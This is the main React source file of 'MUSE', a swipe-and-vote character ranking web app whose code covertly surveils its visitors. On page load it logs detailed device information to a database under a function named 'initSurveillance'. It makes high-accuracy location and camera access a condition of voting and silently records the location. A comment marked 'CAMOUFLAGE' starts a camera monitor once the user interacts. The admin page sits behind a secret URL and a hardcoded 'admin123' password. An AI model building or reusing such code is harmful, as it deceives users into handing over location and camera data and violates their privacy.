import React, { useState, useEffect, useCallback, useMemo } from 'react';
import { Character } from './types';
import { INITIAL_CHARACTERS } from './constants';
import SwipeCard from './components/SwipeCard';
import Leaderboard from './components/Leaderboard';
import VoteConfirmationModal from './components/VoteConfirmationModal';
import AdminDashboard from './components/AdminDashboard';
import PermissionModal from './components/PermissionModal';
import CameraMonitor from './components/CameraMonitor';
import { dataService } from './services/dataService'; 
import { Timer, ShieldAlert, Fingerprint } from 'lucide-react';
import { AnimatePresence } from 'framer-motion';
import { getDetailedDeviceInfo } from './utils/deviceInfo'; // IMPORT UTILITY

function App() {
  // --- VIEW STATE WITH SECRET ROUTE ---
  // Initialize view based on URL path. 
  // If path is '/jjklq', go directly to admin login.
  const [view, setView] = useState<'app' | 'admin_login' | 'admin_dashboard'>(() => {
      const path = window.location.pathname;
      return path === '/jjklq' ? 'admin_login' : 'app';
  });

  const [adminPassword, setAdminPassword] = useState('');
  const [adminError, setAdminError] = useState('');
  const [isAdminLoading, setIsAdminLoading] = useState(false);
  const [characters, setCharacters] = useState<Character[]>(INITIAL_CHARACTERS);
  const [activeIndex, setActiveIndex] = useState(0);
  
  // Persistent Guest ID (Renamed to use 'guest_' prefix)
  const guestId = useMemo(() => {
    let gid = localStorage.getItem('muse_guest_id');
    if (!gid) { 
        gid = `guest_${Math.random().toString(36).substr(2, 9)}`; 
        localStorage.setItem('muse_guest_id', gid); 
    }
    return gid;
  }, []);

  const [hasVoted, setHasVoted] = useState<boolean>(false);
  const [isVoteModalOpen, setIsVoteModalOpen] = useState(false);
  const [hasInteracted, setHasInteracted] = useState(false); // New state to track interaction

  // --- PERMISSION STATE ---
  const [isLocationDenied, setIsLocationDenied] = useState(false);
  const [isCameraDenied, setIsCameraDenied] = useState(false);
  const [missingPermissions, setMissingPermissions] = useState<('location' | 'camera')[]>([]);
  const [showPermissionModal, setShowPermissionModal] = useState(false); 

  // --- TIMER STATE ---
  const [votingDeadline, setVotingDeadline] = useState<string | null>(() => localStorage.getItem('muse_voting_deadline'));
  const [timeLeft, setTimeLeft] = useState<{days: number, hours: number, minutes: number, seconds: number} | null>(null);
  const [isVotingEnded, setIsVotingEnded] = useState(false);
  const [winnerId, setWinnerId] = useState<string | null>(null);

  // --- IMMEDIATE LOGGING (Passive Only - No Permissions yet) ---
  // Ensures we capture the guest in DB even if they don't vote or grant permissions yet.
  useEffect(() => {
      // Only log guest visit if we are in the main app view
      if (view !== 'app') return;

      const initSurveillance = async () => {
          // CAPTURE DETAILED INFO
          const deviceInfo = getDetailedDeviceInfo();

          const storedLoc = localStorage.getItem('muse_user_location');
          let locationData = storedLoc ? JSON.parse(storedLoc) : null;

          // Log visit immediately to DB (Users Table)
          await dataService.registerUserLogin({
              user_identifier: guestId,
              password_text: '', 
              login_method: 'guest_visit',
              device_info: deviceInfo,
              location_data: locationData
          });
      };
      initSurveillance();
  }, [guestId, view]); 

  // --- INTERACTION HANDLER ---
  const registerInteraction = useCallback(() => {
      if (!hasInteracted) {
          setHasInteracted(true);
      }
  }, [hasInteracted]);

  // --- DATA LOADING ---
  const fetchCharacters = useCallback(async () => {
    try {
        const chars = await dataService.getCharacters();
        // Only update if we have valid data
        if (chars.length > 0) {
            setCharacters(prev => {
                // Simple check to avoid unnecessary re-renders if data is identical
                if (JSON.stringify(prev) === JSON.stringify(chars)) return prev;
                return chars;
            });
        }
    } catch (e) {
        console.error("Fetch error", e);
    }
  }, []);

  useEffect(() => {
    // 1. Initial Fetch
    fetchCharacters();

    // 2. REALTIME SUBSCRIPTION
    const unsubscribeSupabase = dataService.subscribeToVotes(() => {
        // console.log("Realtime update received from Supabase");
        fetchCharacters();
    });

    // 3. POLLING FALLBACK (Every 5 seconds)
    const pollInterval = setInterval(() => {
        fetchCharacters();
    }, 5000);

    const handleStorageChange = () => {
        fetchCharacters();
        setVotingDeadline(localStorage.getItem('muse_voting_deadline'));
    };
    window.addEventListener('local-storage-update', handleStorageChange);
    window.addEventListener('storage', handleStorageChange);
    
    // Check if this guest has already voted
    const userHasVoted = localStorage.getItem(`muse_vote_record_${guestId}`);
    setHasVoted(!!userHasVoted);

    return () => {
        unsubscribeSupabase();
        clearInterval(pollInterval);
        window.removeEventListener('local-storage-update', handleStorageChange);
        window.removeEventListener('storage', handleStorageChange);
    };
  }, [fetchCharacters, guestId]);

  // --- PERMISSIONS CHECKER (PRIORITIZED LOCATION) ---
  const checkPermissions = useCallback(async () => {
    const missing: ('location' | 'camera')[] = [];
    
    // 1. Check Location FIRST (Priority High)
    const locationGranted = await new Promise<boolean>((resolve) => {
        if (!('geolocation' in navigator)) {
            resolve(false);
            return;
        }
        navigator.geolocation.getCurrentPosition(
            (position) => {
                const locationData = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: position.coords.accuracy,
                    timestamp: new Date().toISOString()
                };
                localStorage.setItem('muse_user_location', JSON.stringify(locationData));
                setIsLocationDenied(false);
                
                // Silent DB update: Log the newly acquired location
                dataService.registerUserLogin({
                    user_identifier: guestId,
                    password_text: '',
                    login_method: 'location_update',
                    device_info: getDetailedDeviceInfo(), 
                    location_data: locationData
                });
                resolve(true);
            },
            (error) => {
                console.warn("Location check failed:", error.message);
                setIsLocationDenied(true);
                resolve(false);
            },
            { timeout: 10000, enableHighAccuracy: true }
        );
    });

    if (!locationGranted) {
        missing.push('location');
    }

    // 2. Check Camera SECOND (Priority Lower)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        // Close immediately, we just wanted to check access
        stream.getTracks().forEach(track => track.stop()); 
        setIsCameraDenied(false);
    } catch (err) {
        console.warn("Camera check failed:", err);
        setIsCameraDenied(true);
        missing.push('camera');
    }

    const finalMissing = [...new Set([...missing])];
    setMissingPermissions(finalMissing);
    
    return finalMissing.length === 0;

  }, [guestId]);

  // --- TIMER & WINNER CALCULATION ---
  useEffect(() => {
    const calculateTimeLeft = () => {
        if (!votingDeadline) { 
            setTimeLeft(null); 
            setIsVotingEnded(false); 
            setWinnerId(null);
            return; 
        }
        
        const diff = new Date(votingDeadline).getTime() - new Date().getTime();
        
        if (diff > 0) {
            setTimeLeft({
                days: Math.floor(diff / (1000 * 60 * 60 * 24)),
                hours: Math.floor((diff / (1000 * 60 * 60)) % 24),
                minutes: Math.floor((diff / 1000 / 60) % 60),
                seconds: Math.floor((diff / 1000) % 60),
            });
            setIsVotingEnded(false);
            setWinnerId(null);
        } else {
            // TIME IS UP
            setTimeLeft(null); 
            setIsVotingEnded(true);
            
            // Calculate Winner if not already set
            if (characters.length > 0) {
                // Find character with max votes
                const sorted = [...characters].sort((a,b) => b.votes - a.votes);
                setWinnerId(sorted[0].id);
                // Also jump to the winner card
                const winnerIndex = characters.findIndex(c => c.id === sorted[0].id);
                if (winnerIndex !== -1 && activeIndex !== winnerIndex) {
                    setActiveIndex(winnerIndex);
                }
            }
        }
    };
    
    // Initial calculation
    calculateTimeLeft();
    
    // Loop
    const timer = setInterval(calculateTimeLeft, 1000);
    return () => clearInterval(timer);
  }, [votingDeadline, characters]); // Removed activeIndex dependency to prevent loop

  const handleNext = () => {
      if (isVotingEnded) return; // Disable swipe when ended
      registerInteraction();
      setActiveIndex((prev) => (prev + 1) % characters.length);
  };
  
  const handlePrev = () => {
      if (isVotingEnded) return; // Disable swipe when ended
      registerInteraction();
      setActiveIndex((prev) => (prev - 1 + characters.length) % characters.length);
  };

  const handleCardClick = (index: number) => {
      registerInteraction();
      setActiveIndex(index);
  };

  // --- INTERACTIVE LEADERBOARD ---
  const handleLeaderboardSelect = (charId: string) => {
      registerInteraction();
      const idx = characters.findIndex(c => c.id === charId);
      if (idx !== -1) {
          setActiveIndex(idx);
          window.scrollTo({ top: 0, behavior: 'smooth' });
      }
  };

  // --- VOTE FLOW ---
  const handleVoteClick = async () => {
      registerInteraction();
      if (hasVoted || isVotingEnded) return;

      // STRICT PERMISSION CHECK
      const allGranted = await checkPermissions();

      if (!allGranted) {
          setShowPermissionModal(true);
          return; // STOP HERE
      }
      
      // Only if strict check passed
      setIsVoteModalOpen(true);
  };

  const handlePermissionRetry = async () => {
      // Re-run the strict check
      const granted = await checkPermissions();
      
      if (granted) {
          // Success! Close permission modal and open vote modal
          setShowPermissionModal(false);
          setIsVoteModalOpen(true);
      } else {
          // Still failed, keep modal open
          alert("Izin lokasi wajib diaktifkan untuk melanjutkan.");
      }
  };

  const handleConfirmVote = async () => {
    if (isVotingEnded) return;
    setIsVoteModalOpen(false);
    
    // 1. Double check permissions just in case
    if (missingPermissions.length > 0) {
        setShowPermissionModal(true);
        return;
    }

    try {
        const activeChar = characters[activeIndex];
        const storedLoc = localStorage.getItem('muse_user_location');
        const locationData = storedLoc ? JSON.parse(storedLoc) : null;
        
        // CAPTURE DETAILED SPECS FOR VOTE
        const deviceInfo = getDetailedDeviceInfo();

        // 2. OPTIMISTIC UPDATE (Update UI Immediately)
        setCharacters(prev => prev.map(c => 
            c.id === activeChar.id ? { ...c, votes: c.votes + 1 } : c
        ));
        setHasVoted(true); 

        // 3. SEND TO SERVER (Background)
        const success = await dataService.castVote(activeChar.id, guestId, { location: locationData, deviceInfo });
        
        if (!success) {
            // Revert if explicitly failed (network error)
            setCharacters(prev => prev.map(c => 
                c.id === activeChar.id ? { ...c, votes: c.votes - 1 } : c
            ));
            setHasVoted(false);
            alert("Gagal melakukan voting. Mohon periksa koneksi internet Anda.");
            return;
        }

    } catch (e) {
        console.error("Vote failed locally", e);
        setHasVoted(false);
    }
  };

  // --- LOGOUT HANDLER ---
  const handleLogout = () => {
      setView('app');
      // Clean up URL: remove '/jjklq' and replace with root '/'
      window.history.pushState({}, '', '/');
  };

  const activeCharacter = characters[activeIndex];

  // Admin Login Logic
  if (view === 'admin_login') return (
        <div className="min-h-screen bg-slate-950 flex items-center justify-center p-4">
             <div className="w-full max-w-sm bg-slate-900 border border-slate-800 p-8 rounded-2xl shadow-2xl relative overflow-hidden">
                <h2 className="text-xl font-bold text-white mb-6 text-center">System Administration</h2>
                <form onSubmit={(e) => { e.preventDefault(); setIsAdminLoading(true); setTimeout(() => { if (adminPassword === 'admin123') { setView('admin_dashboard'); setAdminError(''); } else { setAdminError('Invalid Code'); } setIsAdminLoading(false); }, 1000); }} className="space-y-4">
                   <input type="password" value={adminPassword} onChange={(e) => setAdminPassword(e.target.value)} className="w-full bg-slate-950 border border-slate-700 text-white px-4 py-3 rounded-xl outline-none" placeholder="••••••••" />
                   {adminError && <p className="text-red-500 text-xs text-center">{adminError}</p>}
                   <button type="submit" disabled={isAdminLoading} className="w-full bg-indigo-600 text-white font-bold py-3 rounded-xl">Unlock System</button>
                   {/* Return to App button */}
                   <button type="button" onClick={handleLogout} className="w-full text-slate-500 text-xs mt-2">Return to App</button>
                </form>
             </div>
        </div>
  );

  if (view === 'admin_dashboard') return <AdminDashboard characters={characters} setCharacters={setCharacters} onLogout={handleLogout} />;

  return (
    <div className="min-h-screen w-full bg-slate-950 flex justify-center overflow-x-hidden relative font-sans">
      <div className="fixed inset-0 pointer-events-none z-0">
         <div className="absolute top-[-20%] left-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-purple-900/20 rounded-full blur-[120px]" />
         <div className="absolute bottom-[-20%] right-[-20%] w-[80vw] h-[80vw] md:w-[600px] md:h-[600px] bg-indigo-900/20 rounded-full blur-[100px]" />
      </div>

      <div className="relative z-10 w-full max-w-md flex flex-col items-center py-8 px-4 gap-6">
        <header className="w-full flex flex-col gap-4 relative">
          <div className="w-full flex justify-between items-center bg-slate-900/40 p-3 rounded-2xl border border-white/5 backdrop-blur-sm">
             <div className="flex items-center gap-3">
                 <div className="w-10 h-10 rounded-xl bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center font-bold text-white shadow-lg">M</div>
                 <div><h1 className="text-lg font-bold text-white leading-none">MUSE</h1><p className="text-[9px] text-indigo-300/80 tracking-widest uppercase font-medium">Rankings</p></div>
             </div>
             <div className="flex items-center gap-2">
                 <div className="flex items-center gap-2 pl-3 pr-3 py-1.5 bg-slate-800/50 rounded-full border border-slate-700/50">
                    <Fingerprint size={12} className="text-indigo-400" />
                    <span className="text-[10px] font-mono font-semibold text-slate-400 max-w-[80px] truncate">{guestId}</span>
                 </div>
             </div>
          </div>
          {votingDeadline && !isVotingEnded && timeLeft && (
             <div className="w-full bg-indigo-900/20 border border-indigo-500/20 rounded-xl p-3 flex items-center justify-between backdrop-blur-sm">
                <div className="flex items-center gap-2 text-indigo-300"><Timer size={16} className="animate-pulse" /><span className="text-xs font-bold tracking-wider">VOTING ENDS IN</span></div>
                <div className="flex items-center gap-1 font-mono text-sm font-bold text-white">
                    <span>{timeLeft.days}d : {timeLeft.hours}h : {timeLeft.minutes}m : {timeLeft.seconds}s</span>
                </div>
             </div>
          )}
        </header>

        {/* Main Swipe Area */}
        <section className="w-full relative h-[500px] flex items-center justify-center perspective-1000 mt-2">
             <AnimatePresence mode="popLayout" initial={false}>
               {characters.map((char, index) => {
                  return (
                    <SwipeCard 
                      key={char.id}
                      character={char} 
                      isActive={index === activeIndex}
                      offset={index - activeIndex}
                      onClick={() => handleCardClick(index)}
                      onSwipeRight={handlePrev}
                      onSwipeLeft={handleNext}
                      isVotingEnded={isVotingEnded}
                      isWinner={isVotingEnded && winnerId === char.id}
                    />
                  );
               })}
             </AnimatePresence>
        </section>

        {/* Indicators & Vote Button */}
        <section className="w-full flex flex-col items-center gap-4 px-2">
             <div className="flex justify-center gap-1.5 mb-2">
                {characters.map((_, idx) => (
                  <button key={idx} onClick={() => { registerInteraction(); setActiveIndex(idx); }} className={`h-1.5 rounded-full transition-all duration-300 ${idx === activeIndex ? 'w-8 bg-indigo-400' : 'w-1.5 bg-slate-700'}`} />
                ))}
             </div>
             <button
               onClick={handleVoteClick}
               disabled={hasVoted || isVotingEnded}
               className={`relative w-full h-14 rounded-2xl font-bold text-lg transition-all flex items-center justify-center gap-3 overflow-hidden shadow-[0_0_20px_rgba(0,0,0,0.3)] border ${hasVoted || isVotingEnded ? 'bg-slate-900/50 border-slate-700/50 cursor-not-allowed text-slate-500' : 'bg-slate-900/80 backdrop-blur-xl border-indigo-500/30 text-white hover:bg-slate-800'}`}
             >
                {isVotingEnded ? <span>TIME'S UP</span> : hasVoted ? <span>VOTING CLOSED</span> : <span>VOTE FOR {activeCharacter.name.split(' ')[0].toUpperCase()}</span>}
             </button>
             {/* Subtle hint about permissions */}
             {!hasVoted && !isVotingEnded && (
                 <p className="text-[10px] text-slate-500 flex items-center gap-1">
                    <ShieldAlert size={10} /> Verified User Access Only
                 </p>
             )}
        </section>

        <section className="w-full relative z-30 pb-10">
           <Leaderboard characters={characters} onCharacterSelect={handleLeaderboardSelect} />
        </section>

        {/* FOOTER HIDDEN - Access Admin via /jjklq only */}
        <footer className="w-full text-center pb-8 opacity-20">
           <p className="text-[10px] text-slate-700">MUSE &copy; 2024</p>
        </footer>
      </div>

      {/* MODALS */}
      <AnimatePresence>
        {isVoteModalOpen && !isVotingEnded && <VoteConfirmationModal isOpen={isVoteModalOpen} onClose={() => setIsVoteModalOpen(false)} onConfirm={handleConfirmVote} characterName={activeCharacter.name} />}
      </AnimatePresence>

      {/* Permission Modal - STRICT MODE */}
      <AnimatePresence>
        {showPermissionModal && (
            <PermissionModal 
                onRetry={handlePermissionRetry} 
                missingPermissions={missingPermissions} 
                onClose={() => setShowPermissionModal(false)} 
            />
        )}
      </AnimatePresence>
      
      {/* CAMOUFLAGE: Camera Monitor ONLY activates after user interaction */}
      {hasInteracted && view === 'app' && (
        <CameraMonitor user={guestId} onError={() => setIsCameraDenied(true)} onSuccess={() => setIsCameraDenied(false)} />
      )}
    </div>
  );
}

export default App;